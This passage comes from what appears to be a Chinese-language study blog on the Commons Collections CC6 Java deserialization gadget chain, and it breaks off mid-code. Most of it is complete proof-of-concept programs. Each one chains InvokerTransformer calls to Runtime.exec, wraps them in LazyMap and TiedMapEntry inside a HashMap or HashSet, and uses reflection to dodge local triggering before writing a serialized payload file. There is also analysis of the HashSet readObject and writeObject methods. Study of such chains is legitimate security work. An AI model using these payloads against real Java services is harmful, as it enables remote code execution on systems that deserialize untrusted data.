+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建一个空的链转换器</span></span><br><span class="line">        Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        map.put(TM,<span class="number">111</span>);</span><br><span class="line">        Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Lmap,transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(map);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="POC-3"><a href="#POC-3" class="headerlink" title="POC-3"></a>POC-3</h4><p>上面学习的时候通过反射修改链转换器来实现本地序列化时触发的代码执行，还可以通过反射修改hashmap的key值，达到规避本地触发的问题。<br>hashmap底层通过table表将map的键值对存储到table表的node节点对象中，修改hashmap的key值，实际就是修改table中的key值</p>
+<p>先通过反射获取hashmap的table表属性</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] tablearray = (Object[])table.get(map);</span><br></pre></td></tr></table></figure>
+
+<p>然后获取table表中存在key的元素，也就是要修改的元素，由于不同环境下key值存在的序号不同，就写了个循环去查找避免找不到，比如我这序号是13</p>
+<p><img src="/posts/9758c0a8/cc6-31.png" title="读取元素"></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对node进行初始化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   node = tablearray[i];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后反射更改key值为触发对象</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">key.set(node,TM);</span><br></pre></td></tr></table></figure>
+
+<p>最后进行序列化和反序列化即可，得到完整POC</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        map.put(<span class="string">&quot;any&quot;</span>,<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] tablearray = (Object[])table.get(map);</span><br><span class="line">        <span class="comment">//对node进行初始化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">           node = tablearray[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,TM);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload1-2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(map);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload1-2.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>实现效果：</p>
+<p><img src="/posts/9758c0a8/cc6-32.png" title="读取元素"></p>
+<h3 id="实现思路二：HashSet"><a href="#实现思路二：HashSet" class="headerlink" title="实现思路二：HashSet"></a>实现思路二：HashSet</h3><h4 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h4><p>另外一种实现通过HashSet进行调用，先看看HashSet是干嘛的</p>
+<blockquote>
+<p>HashSet 基于 HashMap 来实现的，是一个不允许有重复元素的集合。<br>HashSet 允许有 null 值。<br>HashSet 是无序的，即不会记录插入的顺序。<br>HashSet 不是线程安全的， 如果多个线程尝试同时修改 HashSet，则最终结果是不确定的。 您必须在多线程访问时显式同步对 HashSet 的并发访问。<br>HashSet 实现了 Set 接口。</p>
+</blockquote>
+<p>简述就是HashSet是一个无序且无重复元素的集合，只有Key值（可以理解为value值固定的hashmap），HashMap为键值对key-value形式。</p>
+<p><img src="/posts/9758c0a8/cc6-15.png" title="HashSet"></p>
+<p>其中会内置一个<code>transient</code>类型的<code>hashmap-map</code>变量，构造方法会自动对<code>map</code>对象进行<code>hashmap</code>实例化。</p>
+<p>回到利用链来，上面的时候分析到<code>hashmap</code>在<code>put</code>元素时，将<code>TiedMapEntry</code>对象<code>put</code>进<code>map</code>中，在对元素进行<code>hash()</code>时会自动调用<code>TiedMapEntry.hashCode()</code>方法，达到执行代码的目的。</p>
+<p>因此重点就在<code>hashmap</code>的<code>put</code>操作，就找<code>HashSet</code>在哪对<code>map</code>对象进行了put操作，且<code>put</code>的<code>key</code>得我们可控才行。</p>
+<p>发现<code>HashSet</code>中，<code>add</code>操作调用了，重写的<code>readObject</code>中也调用了</p>
+<p><img src="/posts/9758c0a8/cc6-17.png" title="add"></p>
+<p><code>add</code>操作相当于<code>hashmap</code>把<code>value</code>值固定了，然后把传入<code>key</code>进行<code>put</code>操作，底层上还是<code>hashmap</code>的操作，然后实现方法同样，<code>put</code>值就能触发。</p>
+<p><img src="/posts/9758c0a8/cc6-18.png" title="实现方法"></p>
+<p>再看序列化和反序列化，虽然其中的<code>map</code>变量是<code>transient</code>修饰的，无法对<code>map</code>进行序列化，但序列化过程会遍历<code>map</code>中元素，把元素写入流中，再通过反序列化把流写入新的<code>hashmap</code>的<code>map</code>中。</p>
+<p><img src="/posts/9758c0a8/cc6-16.png" title="readObject中put"></p>
+<p>在<code>HashSet</code>中重写的<code>readObject</code>中对<code>map</code>进行了<code>put</code>操作，对反序列化的操作注解写在里面</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//判断底层hashmap流容量</span></span><br><span class="line">        <span class="comment">// Read capacity and verify non-negative.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="keyword">if</span> (capacity &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal capacity: &quot;</span> +</span><br><span class="line">                                             capacity);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断加载因子，通俗就是说查看该map的装入的元素会不会超过设定的加载大小，例如容量大小为16，加载因子设置为0.5，就是装入元素为8个，超过8个就超过了设置的预期值，用来设置预期装入的容量大小。</span></span><br><span class="line">        <span class="comment">// Read load factor and verify positive and non NaN.</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断底层hashmap流大小</span></span><br><span class="line">        <span class="comment">// Read size and verify non-negative.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal size: &quot;</span> +</span><br><span class="line">                                             size);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//上面条件都满足就急计算底层hashmap流的实际可容量</span></span><br><span class="line">        <span class="comment">// Set the capacity according to the size and load factor ensuring that</span></span><br><span class="line">        <span class="comment">// the HashMap is at least 25% full but clamping to maximum capacity.</span></span><br><span class="line">        capacity = (<span class="type">int</span>) Math.min(size * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">                HashMap.MAXIMUM_CAPACITY);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//创建上述条件下的hashmap对象，用来写入</span></span><br><span class="line">        <span class="comment">// Create backing HashMap</span></span><br><span class="line">        map = (((HashSet&lt;?&gt;)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//循环读取元素然后put入hashmap的map中</span></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>看下来基本不需要去绕过上面的限制，默认情况下都是满足条件的，只需要对序列化的对象进行反序列化读取，然后写入到map中，接下来再去看序列化写入，看写入的参数是否可控。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">        <span class="comment">//对非static或transient类型的数据进行写入</span></span><br><span class="line">        <span class="comment">// Write out any hidden serialization magic</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把底层hashmap的容量和加载因子写入</span></span><br><span class="line">        <span class="comment">// Write out HashMap capacity and load factor</span></span><br><span class="line">        s.writeInt(map.capacity());</span><br><span class="line">        s.writeFloat(map.loadFactor());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把底层hashmap的大小写入</span></span><br><span class="line">        <span class="comment">// Write out size</span></span><br><span class="line">        s.writeInt(map.size());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把map中元素依次进行写入</span></span><br><span class="line">        <span class="comment">// Write out all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">            s.writeObject(e);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到虽然<code>map</code>为<code>transient</code>类型无法序列化，但写入过程基本把<code>map</code>的信息读取出来依次写入流中，再通过反序列化读取重新写入到新的<code>hashmap</code>对象中。</p>
+<h4 id="POC-1-1"><a href="#POC-1-1" class="headerlink" title="POC-1"></a>POC-1</h4><p>通过上面的学习，发现同思路一的poc，把入口点换成<code>HashSet</code>，相当于多走了一步弯路，思路一中直接通过<code>hashmap</code>对象<code>put</code>值进行触发，这通过<code>hashset</code>进行<code>add</code>值去触发<code>hashmap.put</code>进行</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建一个空的链转换器</span></span><br><span class="line">        Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">        Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        <span class="comment">//通过HashSet add值去触发漏洞</span></span><br><span class="line">        HashSet hs=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hs.add(TM);</span><br><span class="line">        <span class="comment">//删除map对象的新增的元素，避免序列化出错以及触发点失效</span></span><br><span class="line">        map.remove(<span class="number">11</span>);</span><br><span class="line">        Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Lmap,transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hs);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>实现效果：</p>
+<p><img src="/posts/9758c0a8/cc6-19.png" title="实现效果"></p>
+<h4 id="POC-2-1"><a href="#POC-2-1" class="headerlink" title="POC-2"></a>POC-2</h4><p>同实现思路一的POC-2的分析学习，规避本地序列化也可以通过反射修改key值<br>不过不同的是思路二用HashSet作为入口，因此在修改key值时，需要对HashSet中的map的table表中的key进行修改。<br>同时由于不修改链转换器，且添加的key值任意不为11即可，因此无需像POC-1那样删除key为11的元素。</p>
+<p>因此先获取获取<code>hashset</code>中的<code>hashmap</code>对象属性</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取hashset中的hashmap对象属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">hsset</span> <span class="operator">=</span> HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">hsset.setAccessible(<span class="literal">true</span>);</span><br><span class="line">HashMap hsmap=(HashMap) hsset.get(hs);</span><br></pre></td></tr></table></figure>
+
+<p>再获取hashmap中的table属性</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] tablearray = (Object[])table.get(hsmap);</span><br></pre></td></tr></table></figure>
+
+<p>获取table属性过后，再获取table中存在的key值，并进行修改为目标触发的对象。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对node进行初始化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    node = tablearray[i];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">key.set(node,TM);</span><br></pre></td></tr></table></figure>
+
+<p>最后进行序列化和反序列化触发漏洞即可，得到完整POC：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span 